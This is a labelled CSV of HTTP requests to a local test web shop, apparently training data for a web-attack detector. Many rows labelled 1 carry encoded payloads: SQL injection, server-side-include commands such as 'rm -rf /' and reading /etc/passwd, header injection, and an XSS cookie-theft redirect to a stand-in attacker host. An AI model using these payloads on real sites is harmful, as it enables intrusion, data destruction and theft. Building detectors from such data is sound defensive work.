query,label
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5907&B1=Confirmar HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=22415&provincia=Palencia&ntc=0517144420469351&B1A=Registrar,1
modo=insertar&precioA=229&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=disney&password=ar52eti67&nombre=Mois%E9s&apellidos=Leira+Johe&email=jane%4023horas.ua&dni=73034797E&direccion=Carretera+Castilla+139+9%3FF&ciudad=Oviedo&cp=28811&provincia=Barcelona&ntc=4809909158427521&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnair&pwd=81cob6r&remember=off%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/6909030637832563290.jsp~ HTTP/1.1,1
id=2any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Vino+Rioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito,1
modo=entrar&login=robbert&pwd=5rgullecer&remember=on&B1=%27OR%27a%3D%27a,1
http://localhost:8080/tienda1/publico.Inc HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ehab&password=pio58241&nombre=Vanina&apellidos=Metauten+Suau&email=eiler-philpelli%40cpanelweb.com.af&dni=82384047W&direccion=San+Jose+139%2C+13E&ciudad=Plasenzuela&cp=45200&provinciaA=Salamanca&ntc=6014129235774839&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=surber&password=sacramentaci%F3n&nombre=Malinda&apellidos=Romera+Mignolet&emailA=byrnes%40nuestrasantacruz.um&dni=20918632V&direccion=C%2F+Del+Ingenio%2C+159+&ciudad=Alpicat&cp=13195&provincia=Teruel&ntc=3176719416679407&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beebe%2C4&pwd=music%F38an0&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/6909030637832563290.jsp~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hisko&pwd=misionera&remember=off&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1,1
B2=Vaciar+carrito,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes~ HTTP/1.1,1
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=huong&password=acoMbar&nombre=Macedonio&apellidos=Breceda+Perdig%F3&email=nishio%40granbretana.com.ml&dni=18995930T&direccion=Esta%F1o%2C+92+4%3FC&ciudad=Narros+de+Saldue%F1a&cp=49626&provincia=Guip%FAzcoa&ntc=1818801431707826&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=kortner%40vitalhome.cl&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntcA=4253633913747340&B1=Registrar HTTP/1.1,1
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
B2=Vaciar+carrito,0
modo=registro&login=angeline0&password=tasajo&nombre=Anatal%F3n&apellidos=Gironell+Nurnberg&email=alari-clayton%40blueeyes.mm&dni=02864580E&direccionA=C%2F+Pescadores+De+Terranova%2C+108%2C+9-E&ciudad=Gironella&cp=34309&provincia=Lleida&ntc=1940469779787284&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/6909030637832563290.jsp HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vallet&pwd=es%2Fti%2F%D3meno&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
modo=insertar&precio=3749&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jamilahbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=e0f2n87a&nombre=Virma&apellidos=Duch+Vilarnau&email=rosamond_aloyshina%40videospornocaseros.aq&dni=84711932B&direccion=Alfredo+Donay+178%2C+&ciudad=Casas+del+Monte&cp=17650&provincia=Toledo&ntc=7712379186246495&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=400&B1=Pasar+por+caja HTTP/1.1,1
modo=insertar&precio=5716&B1=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/asf-logo-wide.gif/ HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precioA=39&cantidad=69&B1=A%F1adir+al+carrito HTTP/1.1,1
modo=entrar&login=birk2&pwd=pintipara8a&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charmion&password=eu6eo&nombre=Amalio&apellidos=Bazo+San+Salvador&email=monzano3%40chamilia.com.yu&dni=46460133H&direccion=C%2F+Huescar+60%2C+&ciudad=Urrotz&cp=38370&provincia=Vizcaya&ntc=9036735261224878&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=roig&pwd=verecunda&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tanchak&password=61ticO&nombre=Nao&apellidos=Giuliani+Casabella&email=hillerman.gallo%40muebetuweb.ki&dni=52946142G&direccion=C%2F+Hulla%2C+179+&ciudad=Valverde+de+los+Arroyos&cp=06519&provincia=Vizcaya&ntc=6920897670834539&B1=Registrar HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg.java HTTP/1.1,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=8&B1=A%F1adir+al+carrito,0
modo=registro&login=vera&password=0ip0rbol1id7&nombre=N%3Fel%2Bma&apellidos=Artells+Arteta&email=henn_others%40lasmilyuna.gi&dni=13605020Z&direccion=Paseo+Alcalde+Rafael+Ginel%2C+121+&ciudad=Fuentelisendo&cp=09219&provincia=Madrid&ntc=6311255681512253&B1=Registrar,1
modo=insertar&precio=8151&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=795&B1=Pasar+por+caja%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
id=1&nombre=Queso+Manchego&precioA=85&cantidad=76&B1=A%F1adir+al+carrito,1
modo=registro&login=emmersto&password=inn%FAmera&nombre=Zulmara&apellidos=Estrada+Perdig%F3&email=abrams.peabody%40hojadecalculo.com.py&dni=45555264S&direccion=C%2F+Quintana+132%2C+13%3FH&ciudad=Aveinte&cp=48508&provincia=Teruel&ntc=7043934218522889&B1=Registrar,0
errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=takagi71&pwd=b6e&remember=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=28&B1=A%F1adir+al+carrito HTTP/1.1,0
modo=entrar&login=m%3Fanley&pwd=carteo&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
modo=registro&loginA=radick&password=T76F6li6&nombre=Tercero&apellidos=Muleiro&email=roope%40gesmahernan.kn&dni=54463358W&direccion=Ronda+Cervantes+146%2C+13%3FG&ciudad=Navacarros&cp=12225&provincia=Albacete&ntc=2464400659124948&B1=Registrar,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/.BAK HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=85&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
modo=registro&login=ramaprak&password=garfiada&nombre=Mari+Cielo&apellidos=Ticona&email=samardzic.carafotes%40bru%F1oseguridad.je&dni=56801763C&direccion=Avda.+Augusto+Vazquez%2C+42%2C+1E&ciudad=Fuentes+Claras&cp=17536&provincia=Valladolid&ntc=4476727258540536&B1=Registrar,0
http://localhost:8080/_vti_script/ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
modo=entrar&login=ornelas&pwd=frail%EDa&remember=on&B1=Entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,1
modo=registro&login=%2B&password=encara&nombre=Marcelino&apellidos=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=76973319R&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cantidad=71&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
modo=registro&login=panosh&password=m7866&nombre=Heraclio&apellidos=Carrique+Orri&email=mascarino.marenghi%40cocheacoche.lv&dni=51858384P&direccion=Cami%F1o+Adelfas%2C+148%2C+5%3FG&ciudad=Lladorre&cp=10650&provincia=Zamora&ntc=3869324280583649&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4981&B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
modo=registro&login=carmody&password=borricalmeNtE&nombre=Lihue&apellidos=Figueredo+Ferr%E0s&email=varennes%40so-tel.ni&dni=17014566V&direccion=Rambla+De+Mercedes+149%2C+&ciudad=Hornillos+de+Cameros&cp=23560&provincia=Valladolid&ntc=909516727908316&B1=Registrar,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
modo=insertar&precio=816&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scott&password=retr8t2&nombre=Reinaldo&apellidos=Pampanas+Soto&email=poncin%40todobetis.mil&dni=72429722P&direccion=Plza.+Magallanes%2C+50+&ciudad=Miranda+de+Arga&cp=14640&provincia=Navarra&ntc=3655911674701564&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp/4861362529278789730 HTTP/1.1,1
B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3615&B1=Pasar+por+caja HTTP/1.1,0
id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=21&B1=A%F1adir+al+carrito,1
modo=registro&login=kerlovic&password=lad%F3n&nombre=Vitalia&apellidos=Baeza+Redon&email=slavin%40windshiptrader.coop&dni=95642019S&direccion=Jose+Maria+Mortes+Lerma%2C+151+11-D&ciudad=Campos+del+Para%EDso&cp=18449&provincia=Alicante&ntc=8158378459741170&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=*shel*egey7&pwd=exp8a1%21a6a&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=grace&pwd=parI073l&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/iisadmpwd/achg.htr HTTP/1.1,1
modo=insertar&precio=6074&B1=Confirmar,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pomeroy5&password=C5fRA98&nombre=Bonifacio&apellidos=Iranzo&email=wyle%40designworld.us&dni=88356550A&direccion=C%2F+Ca+N%27alzina%2C+80%2C+6-B&ciudad=Requena+de+Campos&cp=45110&provincia=Granada&ntc=8995996565558024&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
modo=insertar&precio=4580any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
B2A=Vaciar+carrito,1
B2=Vaciar+carrito%22+AND+%221%22%3D%221,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=2&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lennard2&password=segundar&nombre=Armelio&apellidos=Gochez&email=shankley%40discon.sz&dni=25054750E&direccion=C%2F+Fuente+Del+Rey%2C+S%2FN%2C+&ciudad=Gavilanes&cp=36110&provincia=Salamanca&ntc=679646557157740&B1=Registrar HTTP/1.1,1
http://localhost:8080/CFIDE/administrator/checkfile.cfm HTTP/1.1,1
modo=insertar&precio=1063&B1=Confirmar%7C,1
modo=insertar&precio=9111&B1=Confirmar%2F,1
errorMsg=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=5&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=morgan-c&password=ventera&nombre=Abdel&apellidos=Gortari&email=ericsson%40lalectura.gr&dniA=93062910B&direccion=C%2F+Barlovento%2C+111%2C+5%3FH&ciudad=Amurrio&cp=25289&provincia=Guip%FAzcoa&ntc=8608089924764976&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif/~ HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carvalho&password=De42AE0&nombre=Saddam&apellidos=Ponsat%ED+Lemunao&email=bascomb%40elpaisaje.pro&dni=31723380D&direccion=Barri+Sant+Julia+120%2C+13%3FA&ciudad=Palencia+de+Negrilla&cp=50155&provincia=Almer%EDa&ntc=1165920681066048&B1A=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morrie&password=%2Cint%2Ferrogativo&nombre=Erlan&apellidos=Sordo+Alquinta&email=nieva%40menorca.com.sz&dni=22787443D&direccion=Pl.+De+La+Palomera%2C+S%2FN+2%3FD&ciudad=Oss%F3+de+Si%F3&cp=31353&provincia=Badajoz&ntc=5124736256894307&B1=Registrar HTTP/1.1,1
http://localhost:8080/iisstart.htm HTTP/1.1,1
modo=registro&login=norean&password=kri%21sti&nombre=Suray&apellidos=Sogorb+Ipamo&email=cuccu%40professionalhosting.com.uz&dni=20098056N&direccion=Paratge+Barnades%2C+43+&ciudad=Zaldibia&cp=18340&provincia=Le%F3n&ntc=5223158056651718&B1=Registrar,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
id=2,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp.java HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif HTTP/1.1,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=morneau&password=m8rrega&nombre=Nazareth&apellidos=Pico+Despuig&email=gallego%40cajucar.sn&dni=51780892A&direccion=C%2F+Doctor+Temes+Fernandez%2C+35+&ciudad=Marbella&cp=40313&provincia=Lleida&ntc=8788488827685780&B1=Registrar HTTP/1.1,0
id=%27+AND+%271%27%3D%271,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ehrenfri&password=4l6AD1E14&nombre=Ail%E9n&apellidos=Amaro&email=antone1%40tiendasyofertas.ve&dni=97233442E&direccion=C%2F+Artazuri%F1a%2C+43+10%3FE&ciudad=Talarrubias&cp=03400&provincia=Granada&ntc=8954375699794509&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cadtools&pwd=hirco&remember=on%2F&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eme%2Br&pwd=coNMut6BLE&remember=on&B1=Entrar HTTP/1.1,1
modo=entrar&login=sadegh&pwd=PataG%F3N&remember=on&B1=Entrar,0
modo=insertar&precio=7106&B1=Confirmar,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=barkwill8&pwd=cagafierro&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080.Old HTTP/1.1,1
modo=insertar&precio=3916&B1=Confirmar,0
http://localhost:8080.bak HTTP/1.1,1
modo=registro&login=elliot&password=matosa&nombre=Abd%F3n&apellidos=Andreu+Agraso&email=takakura%40cenitsoria.sb&dni=80216904B&direccion=Avinguda+Mas+Fuster+175+8B&ciudad=Fuente-%C1lamo&cp=48112&provincia=Tarragona&ntc=0683879802529946&B1=Registrar,0
modo=insertar&precio=2993&B1=Pasar+por+caja,0
http://localhost:8080/CFIDE/administrator/enter.cfm HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=1&nombre=Queso+Manchego&precio=100&cantidad=15&B1=A%F1adir+al+carrito HTTP/1.1,1
modo=insertar&precio=5303&B1=Confirmar,0
http://localhost:8080/tienda1/4861362529278789730.inc HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
modo=registro&login=sherri&password=ADj9d8cAt0r55&nombre=Amaru&apellidos=Gilabert&email=chimento%40fuzzy.bb&dni=66365789W&direccion=Plaza+Doctor+Quemada+88+8-H&ciudad=Castrocalb%F3n&cp=19268&provincia=Asturias&ntcA=3607118257162367&B1=Registrar,1
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif/.inc HTTP/1.1,1
modo=insertar&precio=9853&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
id=2,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tadlock&pwd=paisaje&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
modo=insertar&precio=8449&B1=Pasar+por+caja,0
modo=registro&login=%2500&password=cartear&nombre=Zaima&apellidos=Falgeras+Puerta&email=hargitay%40corjet.coop&dni=33685330J&direccion=Calle+Pedro+Salinas%2C+15%2C+6%3FH&ciudad=Bierge&cp=44155&provincia=C%E1ceres&ntc=2909791700288840&B1=Registrar,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sultan&password=sOLLar&nombre=Heber&apellidos=Patr%F3n&emailA=fonseke_cicco%40ropadegolf.com.fj&dni=72983438E&direccion=Calle+Azofra+28+&ciudad=Baraona&cp=28694&provincia=Lleida&ntc=5423616197210085&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bekki&password=retinte&nombre=Harry&apellidos=Capella+Gorr%EDn&email=gunner%40piaceredelivery.kw&dni=78532141K&direccion=Isabel+La+Catolica%2C+34+&ciudad=Ribera+d%27Ondara&cp=08250&provincia=Ourense&ntc=7930754215612383&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/servlet/SnoopServlet HTTP/1.1,1
http://localhost:8080/tienda1/publico/6909030637832563290.jsp.Inc HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
idA=2,1
modo=registro&login=walker&password=estate&nombre=Ubaldo&apellidos=Gayol&email=bruzzese%40audiosat.ar&dni=00903443A&direccion=C%2F+Fernan+Gonzalez%2C+45+13-B&ciudad=Joyosa%2C+La&cp=31243&provincia=Valladolid&ntc=7428930336953992&B1=Registrar,0
